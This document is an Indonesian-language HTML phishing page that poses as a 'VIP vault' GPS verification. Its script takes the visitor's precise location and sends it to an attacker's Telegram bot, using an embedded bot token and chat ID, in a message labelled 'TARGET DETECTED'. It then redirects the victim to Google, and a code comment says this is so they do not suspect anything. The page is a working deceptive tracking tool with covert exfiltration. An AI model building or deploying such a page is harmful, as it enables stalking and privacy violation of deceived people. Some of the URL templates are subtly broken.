<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔐 Verifikasi Brankas</title>
    <style>
        body { background: #0d1117; color: #c9d1d9; font-family: sans-serif; text-align: center; padding: 60px 20px; }
        .card { border: 1px solid #30363d; background: #161b22; padding: 40px 20px; border-radius: 12px; max-width: 380px; margin: auto; }
        .btn { background: #238636; color: white; border: none; padding: 16px; font-weight: bold; border-radius: 8px; cursor: pointer; width: 100%; font-size: 16px; }
    </style>
</head>
<body>
<div class="card">
    <h2>🔐 Akses VIP Terkunci</h2>
    <p>Sistem mendeteksi upaya masuk baru. Verifikasi lokasi GPS Anda untuk melanjutkan ke brankas dokumen.</p>
    <button class="btn" onclick="lacak()">VERIFIKASI SEKARANG</button>
</div>
<script>
function lacak() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(kirim, error, {enableHighAccuracy:true});
    } else { alert("Browser tidak didukung."); }
}
function kirim(pos) {
    // API TOKEN ANDA
    const token = "8655474132:AAFyKBASPm1Vjkl92Dcni6hWwTZUQRZeapE";
    // CHAT ID ANDA
    const chatid = "8391310530"; 
    
    const maps = `https://www.google.com{pos.coords.latitude},${pos.coords.longitude}`;
    const teks = `⚠️ **TARGET TERDETEKSI!**\n\n📍 Lokasi: \`${pos.coords.latitude}, ${pos.coords.longitude}\`\n🌍 Buka Peta: ${maps}`;
    
    fetch(`https://api.telegram.org{token}/sendMessage?chat_id=${chatid}&text=${encodeURIComponent(teks)}&parse_mode=Markdown`)
    .then(() => { 
        alert("Selesai: Mengalihkan ke dokumen...");
        window.location.href = "https://google.com"; // Alihkan agar tidak curiga
    });
}
function error() { alert("Izin Ditolak! Brankas tidak bisa dibuka tanpa GPS."); }
</script>
</body>
</html>
